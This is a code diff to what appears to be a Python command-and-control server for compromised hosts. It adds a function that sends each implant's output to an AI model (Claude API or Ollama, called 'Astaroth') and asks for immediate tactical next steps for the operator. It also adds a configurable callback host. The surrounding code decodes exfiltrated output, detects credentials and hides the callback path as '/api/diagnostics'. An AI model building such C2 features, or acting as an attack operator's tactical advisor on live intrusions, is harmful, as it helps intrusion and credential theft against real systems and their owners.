@@ -195,6 +195,57 @@ def _c2_store_result(session_id: str, task_id: str, output: str) -> None:
             sess["last_seen"] = datetime.now()
 
 
+def _auto_analyze_result(session_id: str, task_id: str, output: str, has_creds: bool) -> None:
+    """Fire Astaroth auto-analysis in a background thread when a C2 result arrives."""
+    clean = output.strip()
+    if len(clean) < 80:
+        return
+    if clean == "#< CLIXML" or clean.rstrip() == "#< CLIXML":
+        return
+
+    # Skip silently if neither Claude API nor Ollama is configured
+    if not os.environ.get("ANTHROPIC_API_KEY", "").strip():
+        try:
+            import urllib.request as _ur
+            ollama = os.environ.get("ASTAROTH_OLLAMA_URL", "http://localhost:11434")
+            _ur.urlopen(f"{ollama}/api/tags", timeout=0.5)
+        except Exception:
+            return
+
+    import secrets as _sec, threading
+    try:
+        from server.astaroth import consult_stream
+    except Exception:
+        return
+
+    with _C2_LOCK:
+        sess = _C2_SESSIONS.get(session_id, {})
+        last_seen = sess.get("last_seen", datetime.now())
+        host = sess.get("host", "?")
+
+    context = {
+        "session": {"id": session_id, "host": host},
+        "live":    {"last_seen": last_seen.strftime("%H:%M:%S"), "stale": False},
+        "recent_outputs": [{"command": f"[task:{task_id[:8]}]", "output": clean[:3000]}],
+        "credentials": [],
+        "techniques": [],
+    }
+
+    stream_id = "auto_" + _sec.token_hex(6)
+    _sse_publish({"type": "ast_auto_start", "stream_id": stream_id,
+                  "task_id": task_id, "session_id": session_id})
+
+    question = (
+        "Auto-analysis — review the output above and give immediate tactical next steps. "
+        "What does this reveal? What should the operator do next?"
+    )
+
+    def _run():
+        consult_stream(question, context, stream_id, _sse_publish)
+
+    threading.Thread(target=_run, daemon=True).start()
+
+
 def _c2_get_result(session_id: str, task_id: str) -> str | None:
     """Return and consume the result for task_id (one-shot fetch)."""
     with _C2_LOCK:
@@ -589,6 +640,7 @@ class _Handler(http.server.BaseHTTPRequestHandler):
             has_creds, _ = detect_creds(output)
         _sse_publish({"type": "task_result", "task_id": task_id, "session_id": session_id,
                       "has_creds": has_creds, "ts": datetime.now().strftime("%H:%M:%S")})
+        _auto_analyze_result(session_id, task_id, output, has_creds)
 
     def _handle_callback(self, token: str, body: bytes):
         output = _decode_exfil(body)
@@ -772,6 +824,7 @@ def start_server(
     cert:            str = None,
     key:             str = None,
     callback_prefix: str = "/api/diagnostics",
+    callback_host:   str = "",
 ):
     if cert is None or key is None:
         cert, key = ensure_certs(workspace, lhost)
@@ -783,7 +836,8 @@ def start_server(
     _Handler.workspace       = workspace
     _Handler.callback_prefix = callback_prefix
     _set_ui_workspace(workspace)
-    _SERVER_BASE = f"https://{lhost if lhost != '0.0.0.0' else 'localhost'}:{port}"
+    _cb_host = callback_host or (lhost if lhost not in ("", "0.0.0.0") else "localhost")
+    _SERVER_BASE = f"https://{_cb_host}:{port}"
 
     class _ThreadedHTTPS(socketserver.ThreadingMixIn, http.server.HTTPServer):
         daemon_threads = True
